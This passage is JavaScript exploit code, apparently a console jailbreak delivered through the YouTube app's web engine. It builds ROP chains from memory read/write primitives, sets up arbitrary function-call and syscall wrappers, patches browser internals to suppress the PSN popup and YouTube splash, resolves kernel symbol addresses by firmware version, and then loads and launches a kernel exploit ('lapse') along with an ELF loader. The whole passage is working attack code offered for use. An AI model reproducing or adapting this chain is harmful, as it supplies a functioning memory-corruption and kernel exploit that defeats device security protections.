            rop_chain[rop_i++] = ROP.pop_r8;
            rop_chain[rop_i++] = arg5;
            rop_chain[rop_i++] = ROP.pop_r9;
            rop_chain[rop_i++] = arg6;
            rop_chain[rop_i++] = address;
            rop_chain[rop_i++] = ROP.pop_rdi;
            rop_chain[rop_i++] = return_value_addr;
            rop_chain[rop_i++] = ROP.mov_qword_rdi_rax;
            rop_chain[rop_i++] = ROP.mov_rax_0x200000000;
            rop_chain[rop_i++] = ROP.pop_rbp;
            rop_chain[rop_i++] = saved_fp;
            rop_chain[rop_i++] = ROP.mov_rsp_rbp;
            return pwn(fake_frame);
        }
        
        call = function(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            const bc_start = get_bytecode_addr() + 0x36n;
            write64(bc_start, 0xAB0025n);
            saved_fp = addrof(call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
            write64(bc_start, 0xAB00260325n);
            call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
            return return_value_buf[0];
        }
        
        rop_test = call(ROP.mov_rax_0x200000000);
        await log("ROP test, should see 0x0000000200000000 : " + toHex(rop_test));
        
        if (rop_test !== 0x200000000n) {
            await log("ERROR: ROP test failed");
            throw new Error("ROP test failed");
        }
        
        await log("Disabling PSN dialog and YouTube splash...");

        const window_addr = addrof(window);
        const wrapper_private_addr = read64(window_addr + 0x20n);
        const isolate_addr = read64(wrapper_private_addr + 0x8n);
        const splash_screen_dom_window_addr = read64(wrapper_private_addr + 0x10n);
        const navigator_addr = read64(splash_screen_dom_window_addr + 0xC0n);
        const maybe_freeze_callback_addr = read64(navigator_addr + 0xB0n);
        const browser_module_addr = read64(maybe_freeze_callback_addr + 0x30n);
        const main_web_module_addr = read64(browser_module_addr + 0x678n);
        const main_web_module_impl_addr = read64(main_web_module_addr + 0x18n);
        const main_dom_window_addr = read64(main_web_module_impl_addr + 0x230n);
        const splash_screen_addr = read64(browser_module_addr + 0x898n);
        const splash_screen_web_module_addr = read64(splash_screen_addr + 0x20n);
        const splash_screen_web_module_impl_addr = read64(splash_screen_web_module_addr + 0x18n);

        const main_web_module_generation_addr = browser_module_addr + 0xB08n;
        write32(main_web_module_generation_addr, 0xFFFFFFFFn);
        await log("YT splash disabled!");

        await log("Disabling PSN popup...");
        const sceCommonDialogInitialize_addr = read64(eboot_base + 0x2A65F98n);
        const sceCommonDialogTerminate_addr = sceCommonDialogInitialize_addr + 0x70n;
        call(sceCommonDialogTerminate_addr);
        const on_error_retry_timer_addr = browser_module_addr + 0x960n;
        const is_running_addr = on_error_retry_timer_addr + 0x60n;
        write8(is_running_addr, 0x1n);
        await log("PSN popup disabled!");

        sceKernelGetModuleInfoFromAddr = read64(libc_base + 0x113C08n);
        const gettimeofdayAddr = read64(libc_base + 0x113B18n);
        const mod_info = malloc(0x300);
        const SEGMENTS_OFFSET = 0x160n;
        ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
        if (ret !== 0x0n) {
            await log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + toHex(ret));
            throw new Error("sceKernelGetModuleInfoFromAddr failed");
        }
        libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
        await log("libkernel_base @ " + toHex(libkernel_base));

        syscall_wrapper = gettimeofdayAddr + 0x7n;
        syscall = function(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            const bc_start = get_bytecode_addr() + 0x36n;
            write64(bc_start, 0xAB0025n);
            saved_fp = addrof(call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
            write64(bc_start, 0xAB00260325n);
            call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
            return return_value_buf[0];
        }
        
        libc_strerror = libc_base + 0x73520n;
        libc_error = libc_base + 0xCC5A0n;
        
        await load_localscript('misc.js');
        
        window.original_send_notification = window.send_notification;
        window.send_notification = function(text) {
            let isSystemNotify = false;
            if (typeof text === 'string') {
                const lowerText = text.toLowerCase();
                if (lowerText.includes("[error]") || lowerText.includes("[-]") || 
                    lowerText.includes("error") || lowerText.includes("failed") || 
                    lowerText.includes("exception") || lowerText.includes("lapse") || 
                    lowerText.includes("jailbroken") || lowerText.includes("exploit")) {
                    isSystemNotify = true;
                }
            }
            if (isSystemNotify && typeof window.original_send_notification === 'function') {
                window.original_send_notification(text);
            }
            if (typeof window.uiLog === 'function') {
                window.uiLog(text, isSystemNotify ? "error" : "info");
            }
        };

        await checkLogServer();
        FW_VERSION = get_fwversion();
        send_notification("FW: " + FW_VERSION);
        await log("FW detected : " + FW_VERSION);
        await log("libkernel_base @ " + toHex(libkernel_base));
        try {
            SCE_KERNEL_DLSYM = libkernel_base + get_dlsym_offset(FW_VERSION);
            await log("SCE_KERNEL_DLSYM @ " + toHex(SCE_KERNEL_DLSYM));
        } catch (e) {
            SCE_KERNEL_DLSYM = sceKernelGetModuleInfoFromAddr - 0x450n;
            await log("WARNING : sceKernelDlsym offset not found\nUsing predicted value " + toHex(SCE_KERNEL_DLSYM));
        }
        
        sceKernelAllocateMainDirectMemory = read64(eboot_base + 0x2A65EF8n);
        sceKernelMapNamedDirectMemory = read64(eboot_base + 0x2A65F00n);
        Thrd_create = libc_base + 0x4BF0n;
        Thrd_join = libc_base + 0x49F0n;
        
        await load_localscript('kernel.js');
        await load_localscript('kernel_offset.js');
        await load_localscript('gpu.js');
        await load_localscript('elf_loader.js');
        await load_localscript('lapse.js');
        await load_localscript('update.js');
        await load_localscript('icon_update.js');
        await load_localscript('autoload.js');
        
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(20, "Running kernel exploit...");
        }
        await start_lapse();
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(50, "Kernel exploit finished.");
        }
        await start_update();
        await start_icon_update();
        await start_autoload();
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(100, "Autoload finished.");
        }
        send_notification("Closing YT app");
        await kill_youtube(500);

    } catch (e) {
        if (typeof window.hideUI === 'function') window.hideUI();
        await log('EXCEPTION: ' + e.message);
        await log(e.stack);
        await kill_youtube();
    }
})();
